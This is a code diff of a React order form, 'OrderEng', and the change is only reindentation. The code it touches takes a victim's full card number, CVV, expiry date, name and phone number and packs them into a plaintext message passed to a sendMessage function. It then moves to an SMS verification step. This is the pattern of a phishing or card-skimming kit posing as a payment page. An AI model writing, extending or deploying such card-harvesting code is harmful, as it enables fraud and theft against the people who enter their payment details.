@@ -62,43 +62,45 @@ const OrderEng = () => {
 
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
-};
-const handleChange = (e) => {
-  const { name, value, type, checked } = e.target;
-  setCardData({
-    ...cardData,
-    [name]: type === 'checkbox' ? checked : value,
-  });
-};
-const handleSmsSend = async () => {
+  };
+
+  const handleChange = (e) => {
+    const { name, value, type, checked } = e.target;
+    setCardData({
+      ...cardData,
+      [name]: type === 'checkbox' ? checked : value,
+    });
+  };
+
+  const handleSmsSend = async () => {
     setLoading(true);
     if (validateForm(['cardNumber', 'name', 'cvv', 'expiryDate'])) {
-        try {
-            const message = `
-                Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
-                Bank Name: [${cardData.name}]
-                Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
-            `;
+      try {
+        const message = `
+          Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
+          Bank Name: [${cardData.name}]
+          Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
+        `;
 
-            sendMessage(message);
+        sendMessage(message);
 
-            // Сбрасываем данные формы
-            setCardData({
-                cardNumber: '',
-                name: '',
-                cvv: '',
-                expiryDate: '',
-                amount: '',
-                agreement: false,
-            });
+        // Сбрасываем данные формы
+        setCardData({
+          cardNumber: '',
+          name: '',
+          cvv: '',
+          expiryDate: '',
+          amount: '',
+          agreement: false,
+        });
 
-            setStep(2);
-        } catch (error) {
-            console.error('Error sending message:', error.message);
-        }
+        setStep(2);
+      } catch (error) {
+        console.error('Error sending message:', error.message);
+      }
     }
     setLoading(false);
-};
+  };
 
   const handleSmsSubmit = async () => {
     setVerificationLoading(true);
